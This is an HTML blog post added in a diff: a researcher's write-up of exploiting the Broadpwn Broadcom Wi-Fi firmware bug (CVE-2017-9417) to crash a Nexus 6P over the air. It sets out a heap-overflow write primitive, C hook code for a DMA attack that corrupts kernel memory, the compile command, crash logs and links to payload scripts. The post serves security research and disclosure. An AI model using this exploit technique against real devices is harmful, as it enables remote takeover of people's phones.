@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Crashing phones with Wi-Fi: Exploiting nitayart's Broadpwn bug (CVE-2017-9417)</title>
+<style>
+.monospaced {
+	font-family: "Lucida Console", "Droid Sans Mono", monospace;
+}
+html {
+	font-family: Georgia, "Droid Serif", serif;
+}
+h1, h2, h3 {
+	font-family: Helvetica, Arial, Roboto, sans-serif;
+	color: #00796b;
+}
+a {
+	text-decoration: none;
+	color: #009688;
+}
+a:hover {
+	text-decoration: underline;
+	color: #4db6ac;
+}
+
+a:visited {
+	color: #00796b;
+}
+
+pre {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+hr {
+	color: #4db6ac;
+}
+
+footer {
+	font-family: Helvetica, Arial, Roboto, sans-serif;
+	text-align: right;
+}
+</style>
+</head>
+<body>
+
+<h1>Crashing phones with Wi-Fi: Exploiting nitayart's Broadpwn bug (CVE-2017-9417)</h1>
+
+<p>This is part 2 of a two-part series on Broadpwn: part 1 is here: <a href="/blog/broadpwn/">A cursory analysis of @nitayart's Broadpwn bug (CVE-2017-9417)</a></p>
+
+<h2>﻿TLDR:</h2>
+
+<p>If you're near a malicious Wi-Fi network, an attacker can take over your Wi-Fi chip using <a href="https://twitter.com/nitayart">@nitayart</a>'s <a href="https://www.blackhat.com/us-17/briefings/schedule/#broadpwn-remotely-compromising-android-and-ios-via-a-bug-in-broadcoms-wi-fi-chipsets-7603">Broadpwn bug</a>, and then take over the rest of your phone with Project Zero/<a href="https://twitter.com/laginimaineb">@laginimaineb</a>'s previously disclosed <a href="https://googleprojectzero.blogspot.ca/2017/04/over-air-exploiting-broadcoms-wi-fi_11.html">DMA attack</a>. As a proof of concept, I've made a malicious network which uses these two exploits to corrupt the RAM of my Nexus 6P, causing a crash and reboot.</p>
+
+<h2>Plan</h2>
+
+<p>There's two parts to this proof of concept:</p>
+<ul>
+<li>A method to get arbitrary code execution on the Wi-Fi chip using <a href="https://twitter.com/nitayart">@nitayart</a>'s <a href="https://www.blackhat.com/us-17/briefings/schedule/#broadpwn-remotely-compromising-android-and-ios-via-a-bug-in-broadcoms-wi-fi-chipsets-7603">Broadpwn bug</a></li>
+<li>An implementation of <a href="https://googleprojectzero.blogspot.ca/2017/04/over-air-exploiting-broadcoms-wi-fi_11.html">Project Zero's DMA engine hook</a> to corrupt the kernel in the main system memory over PCIE</li>
+</ul>
+
+<p>The first part is very reliable - I can always get code execution; the second part only worked once and stopped working afterwards. I don't know why.</p>
+
+<h2>Code execution on the Wi-Fi chip</h2>
+
+<p>In the last post, we managed to cause a heap write out of bounds using the Broadpwn bug, which causes the Wi-Fi chip to crash when reading an invalid address. </p>
+
+<p>Here's the crashlog from the previous post:</p>
+
+<pre>
+[  695.399412] CONSOLE: FWID 01-a2412ac4
+[  695.399420] CONSOLE: flags 60040005
+[  695.399425] CONSOLE: 000003.645 
+[  695.399430] CONSOLE: TRAP 4(23fc30): pc 5550c, lr 2f697, sp 23fc88, cpsr 2000019f, spsr 200001bf
+[  695.399435] CONSOLE: 000003.645   dfsr 1, dfar 41414145
+[  695.399441] CONSOLE: 000003.645   r0 41414141, r1 2, r2 1, r3 0, r4 22cc00, r5 217634, r6 217048
+[  695.399449] CONSOLE: 000003.645   r7 2, r8 56, r9 1, r10 216120, r11 217224, r12 8848cb89
+[  695.399455] CONSOLE: 000003.645 
+[  695.399460] CONSOLE:    sp+0 00000002 0022cc00 0022d974 00217634
+[  695.399465] CONSOLE: 000003.645   sp+10 00000004 0001aa83 0022d97f 00000168
+[  695.399471] CONSOLE: 
+[  695.399476] CONSOLE: 000003.645 sp+14 0001aa83
+[  695.399481] CONSOLE: 000003.645 sp+38 000937eb
+[  695.399486] CONSOLE: 000003.645 sp+44 00003b15
+[  695.399492] CONSOLE: 000003.645 sp+4c 00088659
+[  695.399497] CONSOLE: 000003.645 sp+64 00008fc7
+[  695.399502] CONSOLE: 000003.645 sp+74 0000379b
+[  695.399507] CONSOLE: 000003.645 sp+94 00000a29
+[  695.399512] CONSOLE: 000003.645 sp+c4 0019a9e1
+[  695.399517] CONSOLE: 000003.645 sp+e4 00006a4d
+[  695.399523] CONSOLE: 000003.645 sp+11c 00188113
+[  695.399528] CONSOLE: 000003.645 sp+15c 000852ef
+[  695.399533] CONSOLE: 000003.645 sp+180 00019735
+[  695.399538] CONSOLE: 000003.645 sp+194 0001ec73
+[  695.399543] CONSOLE: 000003.645 sp+1bc 00018ba5
+[  695.399549] CONSOLE: 000003.645 sp+1dc 00018a75
+[  695.399554] CONSOLE: 000003.645 sp+1fc 0000656b
+</pre>
+
+<p>First, let's figure out what exactly we're overwriting. According to <a href="https://googleprojectzero.blogspot.ca/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html">Project Zero</a>, heap allocations begin with a 8-byte header: a uint32_t containing the allocation's size and a pointer to the next free chunk if the current chunk is free or null if it's allocated.</p>
+
+<p>I connected to a normal Wi-Fi network that uses QoS, and dumped the Wi-Fi chip's RAM using dhdutil. Next, I used <a href="code/dumpit.py">a modified version</a> of Project Zero's heap visualization script to iterate through the entire heap, looking for allocations that begin with 0050f202 (the start of a WME information element).</p>
+
+<p>It turns out there's two allocations that both begin with this series of bytes: the chunk at 0x1f3550 and at 0x21700c. Both are followed by another chunk 0x78 bytes in size (at 0x1f3584 and 0x217040) Looking at the stack in the crashlog, we can see that r6=0x217048 matches the start of the second allocation, so the address we're overflowing seems to be the second one.</p>
+
+<p>Next, what are we overwriting afterwards? Right now, we only know the next chunk's size (0x78) and contents (a few pointers, no function pointers). Let's look at the code that crashed.</p>
+
+<p>Going up the call stack, we identified a function that contains a printf call with the function name. After cross referencing, we're able to reconstruct this call stack:</p>
+
+<pre>
+0x5550c wlc_hrt_del_timeout
+0x635cc wlc_pm2_sleep_ret_timer_stop
+0x2f670 wlc_set_pm_mode
+0x19734 _wlc_ioctl
+</pre>
+
+<p>So it looks like we overwrote a pointer to a timer, and the firmware crashes when disabling it.</p>
+
+<p>This type of timer is placed in a single linked list when enabled. A timer looks like this:</p>
+
+<pre>
+typedef struct wlc_hrt_to {
+    wlc_hrt_to_t *next; // 0x0
+    list_head *hrti;    // 0x4
+    uint32_t timeout;   // 0x8
+    void *func;         // 0xc
+} wlc_hrt_to_t;
+</pre>
+
+<p>So when disabling a timer, <span class="monospaced">wlc_hrt_del_timeout</span> performs the following:</p>
+
+<ul>
+<li>Check if the passed in pointer to the timer is null; if so, return</li>
+<li>Grab the pointer to the head of the list from the timer</li>
+<li>Iterate through the list until it finds the timer to disable</li>
+<li>Once it finds it, add the remaining time on the timer to the next timer in the sequence</li>
+<li>Perform standard singly-linked list unlink (<span class="monospaced">prev->next = this->next</span>)</li>
+<li>Finally set the function pointer on the timer to null</li>
+</ul>
+
+<p>So how can we turn this into a write primitive? Abuse the timeout addition!</p>
+
+<ul>
+<li>Make a fake timer object</li>
+<li>set the pointer to head of the list to a fake linked list head</li>
+<li>This fake linked list head points to the fake timer object</li>
+<li>Set the next pointer on this fake timer object to point to the code we want to overwrite</li>
+<li>Set the remaining time on this fake object to be (target value - current value at the address we want to overwrite)</li>
+<li>We also overlap the timer's function pointer with the link list head's next pointer</li>
+</ul>
+<p>And so, when the firmware attempts to disable this fake timer, it:</p>
+
+<ul>
+<li>Finds our timer object - it's the first timer in the fake linked list</li>
+<li>Adds the remaining time to the next timer in the list - which is pointing to the code we want to overwrite, giving us a write.</li>
+<li>Does the unlink by setting prev->next (which is the head of the list right now) to this->next</li>
+<li>And zeros out the function pointer. Since we overlapped the fake timer with the fake linked list head, this also zeroes the list head's ->next pointer, so any future attempts to disable this timer will fail gracefully when it sees an empty linked list, preventing crashes.</li>
+</ul>
+
+<p>I decided to use this to change the first instruction of dma64_txfast to a branch instruction that jumps into our overflowed buffer, allowing arbitrary code execution on the Wi-Fi chip.</p>
+
+<p>There's a few other things to take care of:</p>
+
+<ul>
+<li>setting the other pointers in the overwritten structure to null to prevent crashes when the firmware tries to access them</li>
+<li>filling the beginning of the overflowed structure with 0x41 to cause the firmware to disable the fake timer (For some reason, if I set it all to 0x00, the fake timer is never disabled. I don't know why.)</li>
+<li>making sure the firmware doesn't overwrite our payload (I made a payload with 0x41s, connected to the network, dumped the RAM to see which bytes were overwritten, and put code and structures into the intact areas)</li>
+</ul>
+
+<p>but after that, we have code execution! <a href="code/sploit.txt">The payload can be seen here</a>, with comments on the purpose of each part.</p>
+
+<p>Now, what to execute?</p>
+
+<h2>Crashing the main CPU</h2>
+
+<p>Let's implement <a href="https://googleprojectzero.blogspot.ca/2017/04/over-air-exploiting-broadcoms-wi-fi_11.html">Project Zero's DMA attack</a>. The TLDR of their approach is that recent phones connect Wi-Fi chipsets via PCI Express, which allows arbitrary memory writes and reads through DMA. By manipulating the list of DMA buffers on the Wi-Fi chip, an attacker can write any information into main memory, thus getting code execution on the main CPU.</p>
+
+<p>To implement their attack, we use our write primitive to patch the beginning of dma64_txfast to jump into the code in our payload.</p>
+
+<p>Per Project Zero's approach, the exploit code checks if the DMA engine is the "D2H" engine (which does Device-To-Host writes), and, if so, iterate through all DMA descriptors to point them into the Android kernel's code. Since we don't control the data being DMAed, this will only cause a crash on the main CPU, but this is good enough for a proof of concept.</p>
+
+<p>I wrote the <a href="code/shellcode.c">payload in C</a> first:</p>
+
+<pre>
+void dma64_txfast_hook(dma_info_t *di, void *p0, bool commit) {
+	*((unsigned short*)wlc_bss_parse_wme_ie_addr) = 0x4770; // patch out the bug to prevent further damage
+	uint* p = (uint*)(&di->name);
+	if (*p != 0x00483244) return; // D2H
+	dma64dd_t *txd_64 = di->dregs.d64_u.txd_64;
+	for (;;) {
+		if (txd_64->addrlow == 0xdeadbeef) break;
+		txd_64->addrlow = overwrite_addr_low;
+		txd_64->addrhigh = overwrite_addr_high;
+		txd_64++;
+	}
+}
+</pre>
+
+<p>Then compiled it to assembly code:</p>
+<pre>arm-linux-androideabi-gcc -S -Os -mthumb -mcpu=cortex-a9 shellcode.c</pre>
+
+<p>And <a href="code/shellcode_edited2.s">modified the assembly</a> to fit within the payload by splitting it into multiple parts.</p>
+
+<p>I tried to avoid overwriting the heap metadata to avoid instability on the Wi-Fi chip, but in the end I ran out of space in the payload, went "screw it" and overwrote the heap metadata for the last chunk. It doesn't seem to be a problem.</p>
+
+<p>The final payload can be seen <a href="code/sploit.txt">here</a>, along with <a href="code/encode_t2_branch.py">other</a> <a href="code/removecomments.py">useful</a> <a href="code/startit.sh">scripts</a>.</p>
+
+<h2>Result</h2>
+
+<p>Experimental setup: computer same as before (Ubuntu 14.04, hostapd 2.6, Intel 7260 integrated Wi-Fi). Phone same as before: Google/Huawei Nexus 6P: running the latest firmware (N2G48B), but modified with the vulnerable June Broadcom firmware for testing this bug, and with a custom kernel for rooting. Since the bug is in the Wi-Fi firmware only, this should give the same result as an unupdated stock Nexus 6P.</p>
+
+<p>When the device connected to the network, it froze, and then after a few seconds it rebooted. The console-ramoops file (which contains the kernel log from the previous boot) shows a kernel panic from an invalid instruction exception in the kernel. (I tried to overwrite sys_nanosleep, but missed. It seemed to break something at least.)</p>
+
+<pre>
+[ 5887.413947] CFG80211-ERROR) wl_cfg80211_connect : Connecting to (MAC address) with channel (1) ssid (Network)
+[ 5887.420050] CFG80211-ERROR) wl_notify_connect_status : connect failed event=0 e->status 4 e->reason 1
+[ 5887.426601] CFG80211-ERROR) wl_bss_connect_done : Report connect result - connection failed
+[ 5887.474993] WLDEV-ERROR) wldev_set_country : wldev_set_country: set country for CA as US rev 975
+[ 5887.596971] type=1400 audit(1499840123.620:282): avc: denied { syslog_read } for pid=14628 comm="WifiStateMachin" scontext=u:r:system_server:s0 tcontext=u:
+r:kernel:s0 tclass=system permissive=1
+[ 5887.642896] dhd_dbg_monitor_get_tx_pkts(): no tx_status in tx completion messages, make sure that 'd11status' is enabled in firmware, status_pos=0
+[ 5887.810772] HTB: quantum of class 10001 is big. Consider r2q change.
+[ 5887.829826] HTB: quantum of class 10010 is big. Consider r2q change.
+[ 5889.614299] Internal error: Oops - undefined instruction: 0 [#1] PREEMPT SMP
+[ 5889.614322] CPU: 0 PID: 23518 Comm: kworker/0:1 Tainted: G        W    3.10.73-g4f6d61a-00391-gde1f200-dirty #38
+
+[ 5889.614339] Workqueue: events rslow_comp_work
+[ 5889.614350] task: ffffffc0812d8ac0 ti: ffffffc08d134000 task.ti: ffffffc08d134000
+[ 5889.614358] PC is at fg_mem_write+0x3f0/0x4dc
+[ 5889.614364] LR is at fg_mem_write+0x3f0/0x4dc
+[ 5889.614370] pc : [&lt;ffffffc0008b8480&gt;] lr : [&lt;ffffffc0008b8480&gt;] pstate: 60000145
+[ 5889.614374] sp : ffffffc08d137b80
+[ 5889.614379] x29: ffffffc08d137b80 x28: ffffffc0bec2f2c8 
+[ 5889.614388] x27: ffffffc08d137bfe x26: ffffffc08d137c0f 
+[ 5889.614396] x25: ffffffc08d137c10 x24: 0000000000000000 
+[ 5889.614405] x23: ffffffc08d137cc4 x22: 0000000000000000 
+[ 5889.614413] x21: 0000000000000004 x20: 0000000000000001 
+[ 5889.614421] x19: ffffffc0bec2f018 x18: 0000000000000000 
+[ 5889.614429] x17: 0000000000000000 x16: ffffffc00034f1bc 
+[ 5889.614438] x15: 0000000000000000 x14: 0ffffffffffffffe 
+[ 5889.614446] x13: 0000000000000030 x12: 0101010101010101 
+[ 5889.614454] x11: 7f7f7f7f7f7f7f7f x10: 0000000000004410 
+[ 5889.614462] x9 : ffffffc006158018 x8 : ffffffc00168e300 
+[ 5889.614471] x7 : 0000000000000818 x6 : 0000000000000000 
+[ 5889.614479] x5 : 0000000000000818 x4 : 00000000fc4cf000 
+[ 5889.614487] x3 : 0000000000000001 x2 : 09104ccfa95a13c2 
+[ 5889.614495] x1 : 09104ccfa95a13c2 x0 : 0000000000000000 
+
+(snip a few lines)
+
+[ 5889.615088] Process kworker/0:1 (pid: 23518, stack limit = 0xffffffc08d134058)
+[ 5889.615093] Call trace:
+[ 5889.615100] [&lt;ffffffc0008b8480&gt;] fg_mem_write+0x3f0/0x4dc
+[ 5889.615106] [&lt;ffffffc0008b8a38&gt;] fg_mem_masked_write+0x114/0x178
+[ 5889.615113] [&lt;ffffffc0008ba598&gt;] rslow_comp_work+0x238/0x364
+[ 5889.615123] [&lt;ffffffc00023d224&gt;] process_one_work+0x25c/0x3c0
+[ 5889.615129] [&lt;ffffffc00023d580&gt;] worker_thread+0x1f8/0x348
+[ 5889.615139] [&lt;ffffffc000243e70&gt;] kthread+0xc0/0xcc
+[ 5889.615147] Code: f9400660 52800023 11004042 97fff7bc (000103e2) 
+[ 5889.615153] ---[ end trace 48638eec16f50d72 ]---
+[ 5889.628687] Kernel panic - not syncing: Fatal exception
+[ 5889.628851] CPU1: stopping
+
+</pre>
+
+<h2>Impact</h2>
+
+<p>Yep, we've proved Broadpwn to be exploitable. In addition, the heap buffers that are overflowed are allocated at startup, so they are stable for a given firmware version and chip. So if attackers knows your device and your firmware version, they can take over the Wi-Fi chip and then the whole phone.</p>
+
+<p>I think <a href="https://twitter.com/Viss/status/883748060483825664">@Viss</a> has the best advice: just turn Wi-Fi off.</p>
+
+<h2>Stuff I don't know how to do</h2>
+
+<p>There's a few issues that prevents this proof-of-concept from being useful.</p>
+
+<ul>
+<li>Project Zero's proof of concept, implemented here, DMAs random network packets into main memory; can we control what's written so that we can modify the kernel instead of just corrupting and crashing it?</li>
+
+<li>Currently, the Wi-Fi stops working if I trigger the bug, even if I use a payload that doesn't crash the device or the Wi-Fi chip. It just fails to finish connecting to network. An attacker will need to keep the Wi-Fi working to avoid user suspicion and to exfiltrate data.</li>
+
+
+<li>Current payload requires address of buffer that's overflowed + address of dma64_txfast, both of which differs between phones and firmware versions. Is it possible to develop an exploit that works on all devices?</li>
+</ul>
+
+<p><a href="https://www.blackhat.com/us-17/briefings/schedule/#broadpwn-remotely-compromising-android-and-ios-via-a-bug-in-broadcoms-wi-fi-chipsets-7603">@nitayart's Black Hat presentation</a> is likely to cover some of these, so don't miss it.
+
+<h2>Appendix: testing with a different version of firmware</h2>
+
+<p>I have my phone updated to the latest version of Android, so when I need to test this bug, I need to downgrade the Broadcom firmware. Here's how:</p>
+
+<pre>
+$ adb shell
+# setenforce 0
+# cp fw_bcmdhd.bin /data/local/tmp/firmware/
+# chmod 755 /data/local/tmp/firmware/fw_bcmdhd.bin
+# mount -o bind /data/local/tmp/firmware /vendor/firmware
+# stop
+# start
+</pre>
+
+<hr/>
+
+<footer>Zhuowei Zhang (<a href="https://twitter.com/zhuowei">@zhuowei</a>), 2017-07-12</footer>
+
+</body>
+
+</html>
